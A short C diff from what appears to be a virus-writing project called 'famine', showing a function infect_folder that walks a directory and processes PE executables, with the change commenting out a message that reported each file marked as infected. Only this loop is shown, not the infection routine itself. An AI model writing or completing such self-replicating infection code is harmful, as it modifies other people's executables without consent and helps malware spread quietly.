@@ -61,7 +61,7 @@ void				infect_folder(t_famine *famine, char *folder_name)
 	while ((file = readdir(directory)) != NULL) {
 		if (check_file_validity(famine, target_path, file->d_name)) {
 			if ((pe_file = pe(famine, target_path, file->d_name)) != NULL) {
-				printf("Set signature in PE file named %s\n", pe_file->name);
+				//printf("Set signature in PE file named %s\n", pe_file->name);
 			}
 		}
 	}
